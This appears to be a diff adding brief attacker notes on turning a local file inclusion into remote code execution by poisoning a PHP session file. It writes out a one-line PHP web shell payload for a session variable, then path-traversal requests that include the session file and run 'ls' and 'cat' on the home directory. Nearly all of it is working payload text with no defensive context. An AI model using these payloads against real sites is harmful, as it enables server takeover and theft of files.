@@ -1,0 +1,8 @@
+### RCE with sess files
+
+##  Write php script to sess file
+user=<?php system($_GET[1]); ?>
+
+##  RCE with sess file
+m=../../../../var/lib/php/session/sess_91nqdkkad40msgig6a7df1eag2&1=ls ~/
+m=../../../../var/lib/php/session/sess_91nqdkkad40msgig6a7df1eag2&1=cat ~/*
